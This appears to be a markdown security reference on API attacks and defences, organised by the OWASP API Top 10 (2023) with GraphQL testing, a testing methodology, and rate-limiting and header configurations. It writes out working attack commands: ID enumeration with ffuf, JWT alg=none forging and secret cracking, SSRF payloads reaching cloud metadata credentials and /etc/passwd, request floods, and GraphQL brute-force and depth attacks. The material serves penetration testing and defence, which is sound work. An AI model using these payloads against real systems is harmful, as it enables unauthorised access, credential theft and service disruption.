# API Security Reference

OWASP API Security Top 10, REST and GraphQL attack techniques, API testing methodology, authentication weaknesses, and defensive controls.

---

## OWASP API Security Top 10 (2023)

### API1:2023 — Broken Object Level Authorization (BOLA/IDOR)

The most common and impactful API vulnerability. API fails to verify that the requesting user has permission to access the specific object.

**Vulnerable example**:
```
GET /api/v1/users/1234/orders          # Your orders
GET /api/v1/users/1235/orders          # Someone else's orders — same response!
```

**Testing**:
```bash
# Capture a request with your user ID, replace with another user's ID
# Use Burp Suite Intruder or ffuf to enumerate
ffuf -w user_ids.txt -u "https://api.target.com/v1/users/FUZZ/profile" \
  -H "Authorization: Bearer YOUR_TOKEN" -mc 200

# Also test GUIDs — don't assume sequential = not vulnerable
# Try other users' GUIDs from public data (social media profiles, etc.)
```

**Defense**: Server-side authorization check comparing requesting user to resource owner on every request. Never trust client-supplied object IDs without authorization verification.

---

### API2:2023 — Broken Authentication

Weak authentication mechanisms that allow attackers to compromise authentication tokens or exploit implementation flaws.

**Common issues**:
```
- Weak JWT secrets (brute-forceable with jwt-cracker or hashcat)
- JWT algorithm confusion: alg=none accepted, or RS256→HS256 switch
- No brute-force protection on login endpoint
- Sensitive tokens in URL parameters (appear in server logs)
- Long-lived tokens with no refresh mechanism
- Password reset tokens predictable or not expiring
```

**JWT Testing**:
```bash
# Decode JWT (no verification needed)
echo "JWT_PAYLOAD_PART" | base64 -d

# Test alg=none bypass
# Modify header to {"alg":"none"} and remove signature
python3 -c "
import base64, json
header = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')
payload = 'YOUR_PAYLOAD_BASE64'
print(f'{header}.{payload}.')
"

# Test HS256 confusion (for RS256 tokens — use public key as HMAC secret)
# jwt-tool: https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py TOKEN -X k -pk public_key.pem

# Brute-force weak HMAC secret
hashcat -m 16500 jwt_hash.txt wordlist.txt    # JWT HS256/384/512

# jwt-cracker
npm install -g jwt-cracker
jwt-cracker TOKEN wordlist.txt
```

---

### API3:2023 — Broken Object Property Level Authorization

API exposes more object properties than the user should be able to see or modify (mass assignment / excessive data exposure).

**Mass Assignment Example**:
```
# User sends:
PATCH /api/v1/users/me
{"name": "John", "isAdmin": true}

# Server binds all fields including isAdmin → privilege escalation
```

**Excessive Data Exposure**:
```
# API returns full user object including sensitive fields
GET /api/v1/users/me
{
  "id": 1234, "name": "John", "email": "john@example.com",
  "password_hash": "$2b$12$...",  # Should never be returned!
  "ssn": "123-45-6789",           # Sensitive data exposure
  "isAdmin": false
}
```

**Testing**:
```bash
# Try adding unexpected fields to PATCH/PUT requests
# Check response bodies for sensitive fields that shouldn't be visible
# Compare API documentation vs actual response — undocumented fields

# Burp Suite: Param Miner extension — discover hidden parameters
# Arjun: parameter discovery tool
python3 arjun.py -u "https://api.target.com/v1/users/me" -m PATCH
```

---

### API4:2023 — Unrestricted Resource Consumption

API does not limit client requests — leads to DoS, excessive costs, or data scraping.

```bash
# Test for rate limiting absence
# No 429 response after N requests?
for i in {1..1000}; do
  curl -s "https://api.target.com/v1/search?q=test" -H "Auth: TOKEN" -o /dev/null &
done
wait

# Test for excessive response size
# Single request returning millions of records?
curl "https://api.target.com/v1/users?limit=999999" -H "Auth: TOKEN"

# Check for pagination: API without pagination = full data dump per request
```

---

### API5:2023 — Broken Function Level Authorization (BFLA)

API fails to verify authorization for administrative or higher-privilege functions.

```bash
# Test privilege escalation by calling admin endpoints with regular token
GET /api/v1/admin/users           # Admin endpoint
DELETE /api/v1/admin/users/9999   # Admin action with regular user token
POST /api/v1/users/9999/promote   # Elevation endpoint

# Try HTTP method switching
GET /api/v1/users/9999    → 200
DELETE /api/v1/users/9999 → 403  (blocked)
# But try:
POST /api/v1/users/9999?_method=DELETE
X-HTTP-Method-Override: DELETE

# Look for verb tampering bypass
```

---

### API6:2023 — Unrestricted Access to Sensitive Business Flows

API exposes business flows that can be abused — scraping, promo abuse, scalping.

```
- Unlimited account creation via API (no CAPTCHA, no rate limit)
- Buy unlimited items without stock check (race condition)
- Unlimited discount code reuse
- Gift card brute-force via API
- Verify OTP without rate limit (4-digit = 10000 guesses)
```

---

### API7:2023 — Server Side Request Forgery (SSRF)

API accepts a URL and fetches it server-side — attacker can target internal resources.

**Testing**:
```bash
# Common SSRF parameters
url=, link=, src=, path=, callback=, redirect=, uri=, return=, next=

# Target internal services
curl "https://api.target.com/v1/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"  # AWS IMDS
curl "https://api.target.com/v1/fetch?url=http://192.168.1.1/"       # Internal network
curl "https://api.target.com/v1/fetch?url=file:///etc/passwd"         # Local file
curl "https://api.target.com/v1/fetch?url=dict://localhost:6379/info" # Redis internal

# Bypass filters
http://0x7f000001/           # 127.0.0.1 in hex
http://2130706433/           # 127.0.0.1 as integer
http://127.1/                # Short form of 127.0.0.1
http://localhost.attacker.com/  # DNS rebinding
```

---

### API8:2023 — Security Misconfiguration

```
- Unnecessary HTTP methods enabled (TRACE, DELETE on public endpoints)
- Verbose error messages exposing stack traces, database queries
- Missing security headers (CORS misconfiguration, no CSP, no HSTS)
- Default credentials on API management platforms
- Unpatched API frameworks
- Open API documentation exposed (Swagger UI, GraphQL introspection in production)
```

**CORS Misconfiguration**:
```bash
# Test CORS origin reflection
curl -H "Origin: https://evil.com" \
  "https://api.target.com/v1/users/me" -I
# If Access-Control-Allow-Origin: https://evil.com → reflected CORS
# Combined with Access-Control-Allow-Credentials: true → can steal data cross-origin

# Test null origin
curl -H "Origin: null" "https://api.target.com/v1/users/me" -I
```

---

### API9:2023 — Improper Inventory Management

Outdated, unversioned, or undocumented API versions expose vulnerabilities that were fixed in newer versions.

```bash
# Enumerate API versions
ffuf -w versions.txt -u "https://api.target.com/FUZZ/users" \
  -w versions.txt
# versions.txt: v1, v2, v3, v1.0, v1.1, api, beta, test, debug, old, legacy

# Common older version paths
/v1/, /v2/, /api/v1/, /api/v2/
/api/internal/, /api/private/, /api/debug/
/api/old/, /api/legacy/
```

---

### API10:2023 — Unsafe Consumption of APIs

Application consumes third-party APIs without validating responses, trusting returned data, or protecting against third-party API compromise.

---

## GraphQL Security Testing

### Introspection Attack

```bash
# Check if introspection is enabled (should be disabled in production)
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'

# Full schema dump
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { queryType { fields { name description args { name type { name kind ofType { name kind } } } } } } }"}'

# Tools: InQL (Burp extension), GraphQL Voyager (visualizer)
```

### GraphQL Attack Techniques

```bash
# Batch query attack — send 100 login attempts in one request
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ a:login(email:\"user1@test.com\",pass:\"pass1\") b:login(email:\"user2@test.com\",pass:\"pass2\") }"}'

# Field suggestion brute-force (when introspection disabled)
# GraphQL returns "Did you mean X?" for near-misses
curl -X POST https://api.target.com/graphql \
  -d '{"query":"{ userr { id } }"}' | grep "Did you mean"

# Depth attack (DoS via deeply nested query)
{"query": "{ users { friends { friends { friends { friends { id name } } } } } }"}

# Alias attack (bypass rate limiting with aliases)
{"query": "{ a: user(id:1) { email } b: user(id:2) { email } c: user(id:3) { email } }"}
```

---

## API Testing Methodology

### Reconnaissance

```bash
# Discover API endpoints
# Check JS files for API calls
wget -r -l3 https://target.com -A "*.js" -P /tmp/js/
grep -r "api\|/v[0-9]" /tmp/js/ | grep -oP 'https?://[^"]+' | sort -u

# Swagger/OpenAPI documentation
https://api.target.com/swagger.json
https://api.target.com/openapi.json
https://api.target.com/api-docs
https://api.target.com/v1/swagger
https://api.target.com/.well-known/openapi

# robots.txt, sitemap.xml, security.txt
# Wayback Machine: web.archive.org

# ffuf endpoint discovery
ffuf -w /path/to/api_wordlist.txt -u "https://api.target.com/v1/FUZZ" \
  -H "Authorization: Bearer TOKEN" -mc 200,201,301,302,401,403
```

### Authentication Testing Checklist

- [ ] Test login with no password (empty string)
- [ ] Test SQL injection in login fields
- [ ] Test brute force — is there rate limiting / lockout?
- [ ] Test password reset flow — predictable tokens? Token expiry?
- [ ] Test JWT: algorithm confusion, none algorithm, weak secret
- [ ] Test OAuth: open redirect, CSRF on authorization, token leakage
- [ ] Test API key: key in URL params (logged in servers), key rotation
- [ ] Test session fixation and session invalidation on logout

### Authorization Testing Checklist

- [ ] BOLA: Replace your ID with another user's ID in every endpoint
- [ ] BFLA: Call admin endpoints with regular user token
- [ ] Mass assignment: Add privileged fields to update requests
- [ ] HTTP method bypass: GET→POST, override headers
- [ ] Vertical: Access higher privilege functions (user→admin)
- [ ] Horizontal: Access other users' resources (user A→user B data)

---

## API Security Defensive Controls

### Rate Limiting Implementation

```nginx
# Nginx rate limiting
limit_req_zone $binary_remote_addr zone=api_limit:10m rate=10r/s;
limit_req_zone $http_authorization zone=token_limit:10m rate=100r/s;

server {
    location /api/ {
        limit_req zone=api_limit burst=20 nodelay;
        limit_req zone=token_limit burst=50;
        limit_req_status 429;
    }
}
```

```python
# Flask-Limiter (Python)
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(app, key_func=get_remote_address)

@app.route("/api/v1/login", methods=["POST"])
@limiter.limit("5 per minute; 20 per hour")
def login():
    pass
```

### Security Headers for APIs

```
Content-Type: application/json
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000; includeSubDomains
Cache-Control: no-store
Pragma: no-cache
Content-Security-Policy: default-src 'none'
# For CORS — restrict explicitly, never wildcard with credentials
Access-Control-Allow-Origin: https://app.yourdomain.com
Access-Control-Allow-Credentials: true
```

### API Gateway Controls

```yaml
# Kong API Gateway — rate limiting + auth plugin example
plugins:
  - name: rate-limiting
    config:
      minute: 100
      hour: 1000
      policy: local
  - name: jwt
    config:
      secret_is_base64: false
      key_claim_name: kid
  - name: ip-restriction
    config:
      allow: ["192.168.1.0/24", "10.0.0.0/8"]
```

---

## API Security Tools

| Tool | Category | Description |
|---|---|---|
| Burp Suite Pro | Interception Proxy | Full API testing; extensions: InQL, Param Miner, AuthMatrix |
| Postman | API Client | Test and document APIs; environment variables for auth tokens |
| jwt-tool | JWT Testing | Algorithm confusion, brute-force, claim manipulation |
| Arjun | Parameter Discovery | Find hidden GET/POST/JSON parameters |
| ffuf | Fuzzing | Endpoint discovery, parameter fuzzing, auth bypass testing |
| sqlmap | SQL Injection | API endpoint SQLi detection and exploitation |
| GraphQL Voyager | Schema Visualization | Visualize GraphQL schema from introspection |
| InQL | GraphQL Testing | Burp extension for GraphQL schema extraction and testing |
| kiterunner | API Discovery | Context-aware API endpoint brute-forcing |
| mitmproxy | Proxy | Python-scriptable MITM proxy for mobile API testing |
| Nuclei | Automated Scanning | 400+ API-specific templates for CVEs and misconfigs |

## Related Resources
- [Application Security Discipline](disciplines/application-security.md) — OWASP Top 10, secure SDLC
- [Bug Bounty Discipline](disciplines/bug-bounty.md) — API vulnerability research methodology
- [Detection Rules Reference](DETECTION_RULES_REFERENCE.md) — WAF rules for API attacks
- [Enterprise Security Controls](ENTERPRISE_SECURITY_CONTROLS.md) — WAF configuration for API protection
- [Penetration Testing Checklists](PENTEST_CHECKLISTS.md) — Web application and API checklists
